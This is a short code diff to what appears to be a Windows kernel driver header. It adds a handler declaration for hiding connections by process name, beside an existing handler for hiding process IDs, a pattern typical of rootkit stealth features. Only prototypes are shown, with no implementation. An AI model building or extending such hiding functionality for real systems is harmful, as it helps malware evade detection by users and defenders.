@@ -20,6 +20,10 @@ namespace IoctlHandlers
 		_In_ PIRP Irp,
 		_In_ const size_t InputBufferLength);
 
+	NTSTATUS HandleHideConnectProcessName(
+		_In_ PIRP Irp,
+		_In_ const size_t InputBufferLength);
+
 	NTSTATUS HandleHidePID(
 		_In_ PIRP Irp,
 		_In_ const size_t InputBufferLength);
